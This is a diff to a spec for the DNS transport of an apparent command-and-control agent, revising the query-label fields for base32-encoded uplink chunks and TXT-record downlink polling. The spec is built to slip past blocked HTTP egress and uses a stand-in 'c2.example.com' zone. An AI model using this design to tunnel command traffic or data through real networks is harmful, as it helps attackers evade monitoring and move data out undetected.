@@ -25,19 +25,19 @@ Deploy DNS transport when HTTP/HTTPS egress is blocked but a corporate recursive
 ### Uplink (Agent → Server, A query)
 
 ```
-<b32chunk>.<seq4><cid2><tot2>.<aid8>.<zone>
+<b32chunk>.<seq4><cid4><tot4>.<tok8>.<zone>
 ```
 
 | Field | Width | Description |
 |---|---|---|
 | `b32chunk` | ≤ 48 chars | base32(30-byte chunk of AuthWireBuffer) |
 | `seq4` | 4 hex chars | 16-bit rolling packet sequence (0x0001–0xFFFF) |
-| `cid2` | 2 hex chars | chunk index within this packet (0-based) |
-| `tot2` | 2 hex chars | total chunk count for this packet |
-| `aid8` | 8 hex chars | 32-bit agent ID (0x00000000 = first registration) |
+| `cid4` | 4 hex chars | chunk index within this packet (0-based, 0–65535) |
+| `tot4` | 4 hex chars | total chunk count for this packet (1–65535) |
+| `tok8` | 8 hex chars | per-session token (DWORD derived from AES key, not agent ID) |
 | `zone` | variable | configured C2 zone domain |
 
-Example: `nbswy3dpeb3w64tmmq.00010002.deadbeef.c2.example.com`
+Example: `nbswy3dpeb3w64tmmq.000100000001.deadbeef.c2.example.com`
 
 A-record response:
 - `0.0.0.1` — chunk ACK
@@ -48,15 +48,15 @@ A-record response:
 After all uplink chunks ACK'd, agent polls for the response:
 
 ```
-p.<seq4>.<off4>.<aid8>.<zone>
+p.<seq4>.<off8>.<tok8>.<zone>
 ```
 
 | Field | Width | Description |
 |---|---|---|
 | `p` | 1 char | literal prefix distinguishing downlink polls |
 | `seq4` | 4 hex chars | same sequence as the uplink |
-| `off4` | 4 hex chars | byte offset into queued response (step = 189 bytes) |
-| `aid8` | 8 hex chars | agent ID |
+| `off8` | 8 hex chars | byte offset into queued response (DWORD, step = 189 bytes, supports up to 4 GB) |
+| `tok8` | 8 hex chars | per-session token matching the uplink |
 | `zone` | variable | C2 zone |
 
 TXT response: base64-encoded encrypted bytes. Last chunk is prefixed with `0xFF` sentinel; agent strips it to detect end-of-response. Empty TXT = no data ready, agent retries after 500 ms.
